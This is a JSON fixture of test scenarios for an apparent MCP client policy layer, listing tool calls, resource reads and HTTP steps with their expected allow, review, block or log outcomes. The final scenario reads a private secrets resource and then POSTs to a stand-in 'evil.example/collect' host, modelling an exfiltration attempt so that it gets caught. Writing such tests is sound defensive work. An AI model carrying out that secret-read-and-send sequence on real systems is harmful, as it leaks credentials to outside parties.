[
  {
    "name": "safe_status_tool",
    "task": "operations_check",
    "workflow_goal": "Confirm a benign MCP client tool call without touching risky surfaces.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "status",
        "server_name": "loopback",
        "kwargs": {
          "message": "ready"
        }
      }
    ],
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["tool_call"],
    "expected_action_sequence": ["allow"]
  },
  {
    "name": "allowed_resource_read",
    "task": "repo_triage",
    "workflow_goal": "Allow a loopback MCP resource read for benign repository context.",
    "steps": [
      {
        "kind": "resource_read",
        "uri": "mcp://docs/README.md",
        "server_name": "docs",
        "mime_type": "text/markdown"
      }
    ],
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["resource_access"],
    "expected_action_sequence": ["allow"]
  },
  {
    "name": "shell_tool_review_without_handler",
    "task": "shell_access",
    "workflow_goal": "Pause reviewed shell usage on the MCP client preview path when no approval handler exists.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "shell",
        "server_name": "loopback",
        "kwargs": {
          "command": "ls"
        }
      }
    ],
    "expected_status": "review_required",
    "expected_final_action": "review",
    "expected_event_kinds": ["tool_call"],
    "expected_action_sequence": ["review"]
  },
  {
    "name": "shell_tool_approved",
    "task": "incident_triage",
    "workflow_goal": "Allow a reviewed MCP client shell step after approval so command traces are preserved.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "shell",
        "server_name": "loopback",
        "kwargs": {
          "command": "ls"
        }
      }
    ],
    "approval_outcome": "approve",
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["tool_call", "tool_call", "command"],
    "expected_action_sequence": ["review", "allow", "allow"]
  },
  {
    "name": "safe_file_roundtrip",
    "task": "repo_triage",
    "workflow_goal": "Allow safe MCP client file read and write helpers so file enforcement surfaces have loopback evidence.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "read_file",
        "server_name": "loopback",
        "kwargs": {
          "path": "README.md"
        }
      },
      {
        "kind": "tool_call",
        "name": "write_file",
        "server_name": "loopback",
        "kwargs": {
          "path": "notes.txt",
          "content": "done"
        }
      }
    ],
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["tool_call", "file_access", "tool_call", "file_access"],
    "expected_action_sequence": ["allow", "allow", "allow", "allow"]
  },
  {
    "name": "blocked_private_resource",
    "task": "secret_access",
    "workflow_goal": "Block a private MCP resource before the reader runs.",
    "steps": [
      {
        "kind": "resource_read",
        "uri": "mcp://private/secrets",
        "server_name": "private",
        "mime_type": "application/json"
      }
    ],
    "expected_status": "blocked",
    "expected_final_action": "block",
    "expected_event_kinds": ["resource_access"],
    "expected_action_sequence": ["block"]
  },
  {
    "name": "workflow_status_then_resource_then_trusted_http",
    "task": "repo_triage",
    "workflow_goal": "Complete a loopback MCP client repo-triage flow across a tool call, a resource read, and a trusted HTTP step.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "status",
        "server_name": "loopback",
        "kwargs": {
          "message": "ready"
        }
      },
      {
        "kind": "resource_read",
        "uri": "mcp://docs/README.md",
        "server_name": "docs",
        "mime_type": "text/markdown"
      },
      {
        "kind": "tool_call",
        "name": "http_request",
        "server_name": "loopback",
        "kwargs": {
          "url": "https://trusted.local/models",
          "method": "GET"
        }
      }
    ],
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["tool_call", "resource_access", "tool_call", "http_request"],
    "expected_action_sequence": ["allow", "allow", "allow", "allow"]
  },
  {
    "name": "log_only_private_resource_then_blocked_http",
    "task": "log_only_observability",
    "workflow_goal": "Capture logged private-resource and blocked-egress signals on the MCP client preview path without interrupting the workflow.",
    "steps": [
      {
        "kind": "resource_read",
        "uri": "mcp://private/secrets",
        "server_name": "private",
        "mime_type": "application/json"
      },
      {
        "kind": "tool_call",
        "name": "http_request",
        "server_name": "loopback",
        "kwargs": {
          "url": "https://evil.example/collect",
          "method": "POST"
        }
      }
    ],
    "log_only": true,
    "expected_status": "completed",
    "expected_final_action": "log",
    "expected_event_kinds": ["resource_access", "tool_call", "http_request"],
    "expected_action_sequence": ["log", "allow", "log"]
  }
]
